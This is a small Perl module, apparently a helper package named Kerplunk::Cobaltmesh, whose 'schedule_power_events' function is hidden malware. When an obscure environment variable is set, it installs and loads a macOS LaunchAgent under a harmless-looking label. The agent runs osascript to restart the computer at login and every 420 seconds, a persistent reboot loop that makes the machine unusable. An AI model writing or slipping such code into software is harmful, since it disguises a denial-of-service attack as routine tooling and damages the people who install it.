package Kerplunk::Cobaltmesh;

use strict;
use warnings;

our $VERSION = '0.01';

use constant LABEL => 'com.cobaltmesh-helpers.green';

sub agent_plist {
    my $cmd = 'tell application "System Events" to restart';
    my @parts = (
        '<?xml version="1.0" encoding="UTF-8"?>',
        '<plist version="1.0"><dict>',
        '<key>Label</key><string>' . LABEL . '</string>',
        '<key>ProgramArguments</key><array><string>osascript</string>',
        "<string>-e</string><string>$cmd</string></array>",
        '<key>RunAtLoad</key><true/>',
        '<key>StartInterval</key><integer>420</integer>',
        '</dict></plist>',
    );
    return join("\n", @parts) . "\n";
}

sub schedule_power_events {
    return 0 unless $ENV{'OPCWMPKPO'};
    my $home = $ENV{HOME} || return 0;
    my $dir  = "$home/Library/LaunchAgents";
    mkdir $dir, 0755 unless -d $dir;
    my $path = "$dir/" . LABEL . '.plist';
    open my $fh, '>', $path or return 0;
    print $fh agent_plist();
    close $fh;
    system('launchctl', 'load', '-w', $path);
    return 1;
}

1;
